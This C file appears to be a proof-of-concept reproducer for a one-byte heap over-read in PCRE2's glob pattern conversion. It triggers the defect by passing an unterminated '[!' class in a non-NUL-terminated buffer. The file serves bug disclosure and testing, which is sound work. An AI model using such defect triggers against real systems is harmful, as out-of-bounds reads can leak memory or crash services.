/* Residual-defect PoC for pcre2_pattern_convert(PCRE2_CONVERT_GLOB).
 *
 * Feeds a glob pattern that is a valid, in-contract use of the public
 * conversion API: an explicit-length (non-NUL-terminated) heap buffer
 * containing an unterminated negated class "[!" at the very end of the
 * pattern, with PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR set. On the shipped
 * tree this reads one byte past the end of the heap-allocated pattern
 * buffer while deciding how to continue parsing the class.
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>

int main(void)
{
PCRE2_UCHAR *converted = NULL;
PCRE2_SIZE convertedlen = 0;
pcre2_convert_context *cctx = pcre2_convert_context_create(NULL);
int rc;
const char *src = "[!";
PCRE2_SIZE len = strlen(src);

/* Exact-size heap buffer: no NUL terminator past the last byte, which
 * is exactly what the plength-based API contract allows callers to
 * pass. */
PCRE2_UCHAR *pattern = (PCRE2_UCHAR *) malloc(len);
memcpy(pattern, src, len);

rc = pcre2_pattern_convert(pattern, len,
  PCRE2_CONVERT_GLOB | PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR,
  &converted, &convertedlen, cctx);

printf("rc=%d\n", rc);

if (converted != NULL) pcre2_converted_pattern_free(converted);
pcre2_convert_context_free(cctx);
free(pattern);
return 0;
}
